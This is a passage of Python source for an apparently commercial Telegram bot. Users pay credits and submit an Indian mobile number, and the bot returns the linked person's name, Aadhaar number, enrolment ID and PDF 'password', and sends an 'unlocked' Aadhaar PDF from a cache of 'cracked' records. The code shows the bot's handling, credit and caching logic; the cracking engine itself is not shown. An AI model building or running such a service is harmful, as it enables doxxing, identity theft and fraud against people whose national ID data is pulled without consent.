        bot.send_message(chat_id, f"✅ Updated credits for <code>{target_id}</code>.\n💳 Added: <b>{amount}</b>\n💳 New Balance: <b>{new_bal}</b>", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
        send_admin_dashboard(chat_id)
        return
    if text.lower() in ['/cancel', 'cancel', 'reset', '/reset']:
        if str_chat_id in aadhaar_engine.user_page_registry:
            aadhaar_engine.user_page_registry[str_chat_id]['value'] = '__CANCEL__'
        aadhaar_engine.buffered_inputs.pop(str_chat_id, None)
        if str_chat_id in aadhaar_engine.active_engines:
            eng = aadhaar_engine.active_engines.pop(str_chat_id, None)
            if eng:
                try:
                    asyncio.run_coroutine_threadsafe(eng.close(), loop)
                except: pass
        if str_chat_id in aadhaar_engine.active_tasks:
            try:
                aadhaar_engine.active_tasks.remove(str_chat_id)
            except: pass
        user_states[chat_id] = {'step': 'IDLE'}
        bot.send_message(chat_id, "❌ <b>Process Cancelled!</b>", parse_mode='HTML')
        send_welcome_dashboard(chat_id)
        return
    is_group = chat_id < 0
    starts_with_cmd = text.lower().startswith(('/aadhaar', '/aadhar'))
    extracted_target = None
    if is_group:
        if starts_with_cmd:
            cmd_len = len('/aadhaar') if text.lower().startswith('/aadhaar') else len('/aadhar')
            number_part = text[cmd_len:].strip()
            clean_num = re.sub(r'\D', '', number_part)
            if len(clean_num) == 10 and clean_num[0] in '6789':
                extracted_target = clean_num
            elif len(clean_num) > 10 and (number_part.startswith('+91') or clean_num.startswith(('91', '0'))):
                possible_target = clean_num[-10:]
                if possible_target[0] in '6789':
                    extracted_target = possible_target
    else:
        if starts_with_cmd:
            cmd_len = len('/aadhaar') if text.lower().startswith('/aadhaar') else len('/aadhar')
            number_part = text[cmd_len:].strip()
            clean_num = re.sub(r'\D', '', number_part)
            if len(clean_num) == 10 and clean_num[0] in '6789':
                extracted_target = clean_num
            elif len(clean_num) > 10 and (number_part.startswith('+91') or clean_num.startswith(('91', '0'))):
                possible_target = clean_num[-10:]
                if possible_target[0] in '6789':
                    extracted_target = possible_target
        else:
            clean_num = re.sub(r'\D', '', text)
            if len(clean_num) == 10 and clean_num[0] in '6789':
                extracted_target = clean_num
            elif len(clean_num) > 10 and (text.startswith('+91') or clean_num.startswith(('91', '0'))):
                possible_target = clean_num[-10:]
                if possible_target[0] in '6789':
                    extracted_target = possible_target
    if extracted_target:
        if stats_manager.get_bot_mode() == "paid":
            credits = stats_manager.get_user_credits(chat_id)
            if credits <= 0:
                send_zero_credits_dashboard(chat_id)
                return
        cached_record = stats_manager.find_cracked_record(extracted_target)
        if cached_record:
            if stats_manager.get_bot_mode() == "paid":
                stats_manager.deduct_user_credit(chat_id)
            name = cached_record.get("name", "N/A")
            uid = cached_record.get("uid", "N/A")
            password = cached_record.get("password", "N/A")
            eid = cached_record.get("eid", "N/A")
            cached_text = (
                "🎉 <b>Record Found! (Instant)</b>\n\n"
                f"👤 <b>Name:</b> <code>{name}</code>\n"
                f"📞 <b>Mobile:</b> <code>{extracted_target}</code>\n"
                f"🆔 <b>EID:</b> <code>{eid}</code>\n"
                f"🔢 <b>Aadhaar:</b> <code>{uid}</code>\n"
                f"🔑 <b>Password:</b> <code>{password}</code>"
            )
            bot.send_message(chat_id, cached_text, parse_mode='HTML')
            try:
                safe_name = "".join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip().replace(' ', '_')
                safe_uid = uid.replace(' ', '')
                pdf_path = os.path.join(aadhaar_engine.CRACKED_DIR, f"{safe_name}_{safe_uid}.pdf")
                if os.path.exists(pdf_path):
                    with open(pdf_path, 'rb') as f:
                        bot.send_document(chat_id, f, caption=f"📄 <b>Aadhaar PDF (Unlocked)</b>")
            except Exception as e_pdf:
                print(f"⚠️ [CACHE] Failed to send PDF: {e_pdf}")
            send_welcome_dashboard(chat_id)
            return
        print(f"🔄 Override: Preempting for {chat_id} -> {extracted_target}")
        aadhaar_engine.user_page_registry.pop(str_chat_id, None)
        aadhaar_engine.buffered_inputs.pop(str_chat_id, None)
        if str_chat_id in aadhaar_engine.active_engines:
            eng = aadhaar_engine.active_engines.pop(str_chat_id, None)
            if eng:
                try:
                    asyncio.run_coroutine_threadsafe(eng.close(), loop)
                except: pass
        if str_chat_id in aadhaar_engine.active_tasks:
            try:
                aadhaar_engine.active_tasks.remove(str_chat_id)
            except: pass
        aadhaar_engine.prewarm_engine(bot, chat_id, extracted_target)
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_male = types.InlineKeyboardButton("👨 Male", callback_data="mp|Mr.")
        btn_female = types.InlineKeyboardButton("👩 Female", callback_data="mp|Mrs.")
        btn_manual = types.InlineKeyboardButton("✏️ Enter Name Manually", callback_data="mp|manual")
        markup.add(btn_male, btn_female)
        markup.add(btn_manual)
        msg_text = get_ui_card(
            step_num="2",
            title="Gender / Prefix Selection",
            description="👇 <b>Select the gender/prefix of the Aadhaar holder:</b>",
            target=extracted_target,
            show_tip=True
        )
        bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='HTML')
        user_states[chat_id] = {'step': 'AWAITING_MANUAL_PREF_SELECTION', 'num': extracted_target}
        return
    if str_chat_id in aadhaar_engine.user_page_registry and aadhaar_engine.user_page_registry[str_chat_id].get('value') is None:
        aadhaar_engine.user_page_registry[str_chat_id]['value'] = text
        if chat_id < 0:
            try:
                bot.delete_message(chat_id, message.message_id)
            except: pass
        return
    elif state.get('step') == 'PROCESSING':
        aadhaar_engine.buffered_inputs[str_chat_id] = text
        if chat_id < 0:
            try:
                bot.delete_message(chat_id, message.message_id)
            except: pass
        return
    if state.get('step') == 'AWAITING_NAME':
        prefix = state.get('prefix', '')
        name = f"{prefix}{text}".strip()
        num = state.get('num', '')
        status_msg = get_ui_card(
            step_num="3",
            title="EID Retrieval",
            description=f"⏳ <b>Initializing target {num}...</b>\n\nPlease wait..."
        )
        bot.send_message(chat_id, status_msg, parse_mode='HTML')
        user_states[chat_id]['step'] = 'PROCESSING'
        user_info = {
            'username': message.from_user.username or 'N/A',
            'first_name': message.from_user.first_name or 'N/A'
        }
        dob = None
        asyncio.run_coroutine_threadsafe(execute_and_reset(chat_id, name, num, dob, user_info=user_info), loop)
        return


async def execute_and_reset(chat_id, name, num, dob, user_info=None):
    task_started = False
    try:
        is_admin = chat_id in ADMIN_IDS
        if stats_manager.get_bot_mode() == "paid":
            credits = stats_manager.get_user_credits(chat_id)
            if credits <= 0:
                send_zero_credits_dashboard(chat_id)
                user_states[chat_id] = {'step': 'IDLE'}
                return
        if not is_admin:
            allowed, remaining_seconds = stats_manager.check_global_cooldown()
            if not allowed:
                cooldown_msg = (
                    "⏳ <b>Bot Cooldown Active!</b>\n"
                    f"🕒 Kripya <b>{remaining_seconds}s</b> baad try karein."
                )
                bot.send_message(chat_id, cooldown_msg, parse_mode='HTML')
                user_states[chat_id] = {'step': 'IDLE'}
                send_welcome_dashboard(chat_id)
                return
        if not is_admin:
            stats_manager.update_global_run_time()
        task_started = await aadhaar_engine.execute_task(bot, chat_id, name, num, dob, user_info=user_info)
    except Exception as e:
        print(f"❌ [execute_and_reset] {e}")
        try:
            stats_manager.log_error(chat_id, user_info, f"execute_and_reset: {e}")
        except: pass
    finally:
        if task_started:
            user_states[chat_id] = {'step': 'IDLE'}
            try:
                send_welcome_dashboard(chat_id)
            except: pass


def cleanup_temp_files():
    print("🧹 [CLEANUP] Sweeping residual temp files...")
    import shutil
    prefixes = ['temp_captcha_', 'cap_ui_', 'cap_um_']
    for file in os.listdir(BASE_DIR):
        if any(file.startswith(prefix) for prefix in prefixes):
            try:
                os.remove(os.path.join(BASE_DIR, file))
                print(f"🗑️ Cleaned: {file}")
            except: pass
    cracked_dir = os.path.join(BASE_DIR, 'cracked_aadhar')
    os.makedirs(cracked_dir, exist_ok=True)
    print(f"📁 [CLEANUP] Output folder ready: {cracked_dir}")
    bulk_dir = os.path.join(BASE_DIR, 'BULK_USER_DATA')
    if os.path.exists(bulk_dir):
        try:
            shutil.rmtree(bulk_dir, ignore_errors=True)
        except: pass


if __name__ == "__main__":
    cleanup_temp_files()

    # Remove any stale webhook
    try:
        webhook_info = bot.get_webhook_info()
        if webhook_info and webhook_info.url:
            print(f"🌐 Found stale webhook: {webhook_info.url}")
            print("🧹 Removing webhook to allow polling...")
            bot.remove_webhook()
            time.sleep(2)
            print("✅ Webhook removed.")
        else:
            print("✅ No active webhook. Safe to poll.")
    except Exception as we:
        print(f"⚠️ Webhook cleanup failed: {we}")

    try:
        bot.delete_webhook(drop_pending_updates=True)
    except Exception as de:
        print(f"⚠️ delete_webhook drop_pending failed: {de}")

    loop = asyncio.new_event_loop()
    def run_loop(l):
        asyncio.set_event_loop(l)
        l.run_until_complete(aadhaar_engine.init_pool(bot))
        l.run_forever()

    threading.Thread(target=run_loop, args=(loop,), daemon=True).start()

    print("🤖 Bot is now LIVE.")

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, allowed_updates=['message', 'callback_query'])
        except Exception as e:
            print(f"⚠️ Polling Exception: {e}")
            time.sleep(5)
